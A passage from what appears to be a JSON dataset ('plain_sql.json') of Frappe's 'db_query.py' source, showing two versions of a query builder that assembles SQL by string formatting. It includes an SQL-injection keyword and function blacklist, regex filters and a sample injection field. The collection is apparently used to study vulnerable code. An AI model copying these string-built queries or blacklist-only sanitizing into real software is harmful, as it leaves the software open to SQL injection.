%(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)\n\n\t\tdef _is_query(field):\n\t\t\tif re.compile(\"^(select|delete|update|drop|create)\\s\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\telif re.compile(\"\\s*[a-zA-z]*\\s*( from | group by | order by | where | join )\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\t_is_query(field)\n\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\tkwargs.pop('ignore_permissions', None)\n\n\t# If doctype is child table\n\tif frappe.is_table(doctype):\n\t\t# Example frappe.db.get_list('Purchase Receipt Item', {'parent': 'Purchase Receipt'})\n\t\t# Here purchase receipt is the parent doctype of the child doctype Purchase Receipt Item\n\n\t\tif not kwargs.get('parent'):\n\t\t\tfrappe.flags.error_message = _('Parent is required to get child table data')\n\t\t\traise frappe.PermissionError(doctype)\n\n\t\tcheck_parent_permission(kwargs.get('parent'), doctype)\n\t\tdel kwargs['parent']\n\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mbhavesh95863/frappe/blob/9e2e65f3054c52652b3491713f28d80b80efdfd3",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\t\tregex = re.compile('^.*[,();].*')\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)\n\n\t\tfor field in self.fields:\n\t\t\tif regex.match(field):\n\t\t\t\tif any(keyword in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() \\\n\t\t\t\t\tfor keyword in 